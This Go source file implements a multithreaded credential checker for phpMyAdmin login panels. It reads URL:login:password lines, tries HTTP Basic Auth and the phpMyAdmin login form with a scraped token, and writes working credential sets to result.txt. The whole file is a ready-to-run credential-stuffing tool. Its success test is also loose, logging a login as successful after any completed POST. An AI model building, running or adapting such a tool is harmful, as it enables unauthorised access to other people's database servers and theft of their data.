package checker

import (
	"bufio"
	"fmt"
	"io"
	"log"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"regexp"
	"strings"
	"sync"
	"time"
)

var (
	liPmaVersionRegex = regexp.MustCompile(`(?i)<span[^>]*class=["']version["'][^>]*>([^<]+)</span>`)
	tokenRegex        = regexp.MustCompile(`(?i)<input[^>]+name=["']token["'][^>]*value=["']([^"']+)["']`)
	logoutRegex       = regexp.MustCompile(`logout`)
)

type Job struct {
	line string
}

type Result struct {
	Total int
	Good  int
	Bad   int
}

func worker(id int, jobs <-chan Job, wg *sync.WaitGroup, mu *sync.Mutex,
	goodFile, badFile, resultFile *os.File, res *Result) {

	defer wg.Done()

	for job := range jobs {
		line := strings.TrimSpace(job.line)
		if line == "" {
			continue
		}

		mu.Lock()
		res.Total++
		mu.Unlock()

		lastColon := strings.LastIndex(line, ":")
		if lastColon == -1 {
			log.Printf("[!] Incorrect string (no password): %s", line)
			mu.Lock()
			fmt.Fprintln(badFile, line)
			res.Bad++
			mu.Unlock()
			continue
		}

		secondLastColon := strings.LastIndex(line[:lastColon], ":")
		if secondLastColon == -1 {
			log.Printf("[!] Incorrect string (no login): %s", line)
			mu.Lock()
			fmt.Fprintln(badFile, line)
			res.Bad++
			mu.Unlock()
			continue
		}

		rawURL := line[:secondLastColon]
		login := line[secondLastColon+1 : lastColon]
		password := line[lastColon+1:]

		jar, _ := cookiejar.New(nil)
		client := &http.Client{
			Jar: jar,
			CheckRedirect: func(req *http.Request, via []*http.Request) error {
				return nil
			},
			Timeout: 5 * time.Second,
		}

		req, _ := http.NewRequest("GET", rawURL, nil)
		resp, err := client.Do(req)
		if err != nil {
			log.Printf("GET error %s: %v", rawURL, err)
			mu.Lock()
			fmt.Fprintln(badFile, rawURL)
			res.Bad++
			mu.Unlock()
			continue
		}

		if resp.StatusCode == http.StatusUnauthorized {
			log.Printf("[401] %s requires authorization—let's try BasicAuth", rawURL)
			resp.Body.Close()
			req, _ = http.NewRequest("GET", rawURL, nil)
			req.SetBasicAuth(login, password)
			resp, err = client.Do(req)
			if err != nil {
				log.Printf("GET error %s BasicAuth: %v", rawURL, err)
				mu.Lock()
				fmt.Fprintln(badFile, rawURL)
				res.Bad++
				mu.Unlock()
				continue
			}
		}

		body, err := io.ReadAll(resp.Body)
		resp.Body.Close()
		if err != nil {
			log.Printf("Error reading response from %s: %v", rawURL, err)
			mu.Lock()
			fmt.Fprintln(badFile, rawURL)
			res.Bad++
			mu.Unlock()
			continue
		}
		page := string(body)

		if liPmaVersionRegex.MatchString(page) {
			mu.Lock()
			fmt.Fprintln(goodFile, rawURL)
			log.Printf("[GOOD] %s contains a version", rawURL)
			res.Good++
			mu.Unlock()
			continue
		}

		matches := tokenRegex.FindStringSubmatch(page)
		if len(matches) < 2 {
			log.Printf("Token not found on %s", rawURL)
			mu.Lock()
			fmt.Fprintln(badFile, rawURL)
			res.Bad++
			mu.Unlock()
			continue
		}
		token := matches[1]
		log.Printf("Token found on %s: %s", rawURL, token)

		form := url.Values{}
		form.Set("token", token)
		form.Set("pma_username", login)
		form.Set("pma_password", password)
		form.Set("server", "1")

		postURL := strings.TrimRight(rawURL, "/") + "/index.php?route=/"
		req, _ = http.NewRequest("POST", postURL, strings.NewReader(form.Encode()))
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")

		resp, err = client.Do(req)
		if err != nil {
			log.Printf("POST error %s: %v", postURL, err)
			mu.Lock()
			fmt.Fprintln(badFile, rawURL)
			res.Bad++
			mu.Unlock()
			continue
		}
		body, err = io.ReadAll(resp.Body)
		resp.Body.Close()
		if err != nil {
			log.Printf("Error reading response after POST to %s: %v", postURL, err)
			mu.Lock()
			fmt.Fprintln(badFile, rawURL)
			res.Bad++
			mu.Unlock()
			continue
		}
		page = string(body)

		if resp.StatusCode == http.StatusFound {
			location := resp.Header.Get("Location")
			if !strings.HasPrefix(location, "http") {
				base, _ := url.Parse(rawURL)
				rel, _ := url.Parse(location)
				location = base.ResolveReference(rel).String()
			}
			resp, err = client.Get(location)
			if err != nil {
				log.Printf("Redirect error on %s: %v", location, err)
				mu.Lock()
				fmt.Fprintln(badFile, rawURL)
				res.Bad++
				mu.Unlock()
				continue
			}
			body, err = io.ReadAll(resp.Body)
			resp.Body.Close()
			if err != nil {
				log.Printf("Error reading body after redirect: %v", err)
				mu.Lock()
				fmt.Fprintln(badFile, rawURL)
				res.Bad++
				mu.Unlock()
				continue
			}
			page = string(body)
		}

		match := liPmaVersionRegex.FindStringSubmatch(page)
		if len(match) >= 2 {
			version := match[1]
			result := fmt.Sprintf("%s:%s:%s:%s", rawURL, login, password, version)
			mu.Lock()
			fmt.Fprintln(resultFile, result)
			log.Printf("[SUCCESS] %s => %s", rawURL, version)
			res.Good++
			mu.Unlock()
		} else {
			result := fmt.Sprintf("%s:%s:%s", rawURL, login, password)
			mu.Lock()
			fmt.Fprintln(resultFile, result)
			log.Printf("[SUCCESS] %s", rawURL)
			res.Good++
			mu.Unlock()
		}
	}
}

func RunChecker(input string, workers int) {
	inputFile, err := os.Open(input)
	if err != nil {
		log.Fatalf("Could not open %s: %v", input, err)
	}
	defer inputFile.Close()

	goodFile, _ := os.Create("good.txt")
	defer goodFile.Close()

	badFile, _ := os.Create("bad.txt")
	defer badFile.Close()

	resultFile, _ := os.Create("result.txt")
	defer resultFile.Close()

	jobs := make(chan Job, 100)
	var wg sync.WaitGroup
	var mu sync.Mutex
	res := &Result{}

	for w := 1; w <= workers; w++ {
		wg.Add(1)
		go worker(w, jobs, &wg, &mu, goodFile, badFile, resultFile, res)
	}

	scanner := bufio.NewScanner(inputFile)
	for scanner.Scan() {
		line := scanner.Text()
		jobs <- Job{line: line}
	}
	close(jobs)

	wg.Wait()
	log.Printf("Completed. Total: %d | Successful: %d | Errors: %d", res.Total, res.Good, res.Bad)
}
